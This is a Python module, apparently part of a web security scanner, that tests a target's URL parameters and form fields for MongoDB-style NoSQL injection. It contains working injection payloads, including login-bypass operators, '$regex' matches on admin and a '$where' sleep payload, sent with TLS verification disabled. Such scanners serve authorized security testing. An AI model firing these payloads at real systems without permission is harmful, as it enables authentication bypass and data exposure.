"""
APEX NoSQL Injection Scanner
MongoDB, Redis, Firebase, CouchDB injection detection
"""
import json
import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


def scan_nosqli(target_url, discovered):
    """Scan for NoSQL injection vulnerabilities."""
    vulns = []
    sess = requests.Session()
    sess.verify = False

    # MongoDB injection payloads
    mongo_payloads = [
        {'$gt': ''},
        {'$ne': None},
        {'$regex': '.*'},
        {'$exists': True},
        {'$where': '1==1'},
        {'username': {'$gt': ''}, 'password': {'$gt': ''}},
        {'$or': [{'username': 'admin'}, {'password': {'$regex': '.*'}}]},
    ]

    # Error patterns for NoSQL
    nosql_errors = [
        'MongoError', 'MongoDB', 'mongo', 'BSON',
        'redis', 'Redis', 'ERR wrong number of arguments',
        'firebase', 'Firebase', 'firestore',
        'couchdb', 'CouchDB', 'couch',
        '$gt', '$regex', '$where',
    ]

    for page in discovered.get('pages', [])[:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in mongo_payloads[:5]:
                    try:
                        test_params = params.copy()
                        # Try JSON injection
                        json_payload = json.dumps({param: payload})
                        test_params[param] = [json_payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)

                        for error in nosql_errors:
                            if error.lower() in r.text.lower():
                                vulns.append({
                                    'type': 'nosqli', 'subtype': 'mongodb',
                                    'endpoint': page, 'parameter': param,
                                    'payload': json_payload,
                                    'result': f'NoSQL error: {error}',
                                    'confirmed': True, 'severity': 'critical',
                                    'target': target_url,
                                    'description': f'NoSQL injection via {param}.'
                                })
                                break
                        if vulns and vulns[-1].get('parameter') == param:
                            break
                    except:
                        pass

                # Try timing-based detection
                timing_payload = json.dumps({param: {'$where': 'sleep(3000)'}})
                try:
                    test_params = params.copy()
                    test_params[param] = [timing_payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    start = time.time()
                    r = sess.get(test_url, timeout=8)
                    elapsed = time.time() - start
                    if elapsed > 2.5:
                        vulns.append({
                            'type': 'nosqli', 'subtype': 'blind-time',
                            'endpoint': page, 'parameter': param,
                            'payload': timing_payload,
                            'result': f'Time delay {elapsed:.1f}s',
                            'confirmed': True, 'severity': 'critical',
                            'target': target_url,
                            'description': f'Blind NoSQL injection via {param}.'
                        })
                except:
                    pass

    # Test forms with JSON content
    for form in discovered.get('forms', [])[:10]:
        for inp in form.get('inputs', [])[:5]:
            name = inp.get('name', '')
            if not name:
                continue
            for payload in mongo_payloads[:3]:
                try:
                    data = {name: payload}
                    headers = {'Content-Type': 'application/json'}
                    if form.get('method') == 'post':
                        r = sess.post(form['url'], json=data, headers=headers, timeout=5)
                    else:
                        r = sess.get(form['url'], json=data, headers=headers, timeout=5)
                    for error in nosql_errors:
                        if error.lower() in r.text.lower():
                            vulns.append({
                                'type': 'nosqli', 'subtype': 'mongodb',
                                'endpoint': form['url'], 'parameter': name,
                                'payload': json.dumps(payload),
                                'result': f'NoSQL error: {error}',
                                'confirmed': True, 'severity': 'critical',
                                'target': target_url,
                                'description': f'NoSQL injection via form field {name}.'
                            })
                            break
                except:
                    pass

    return vulns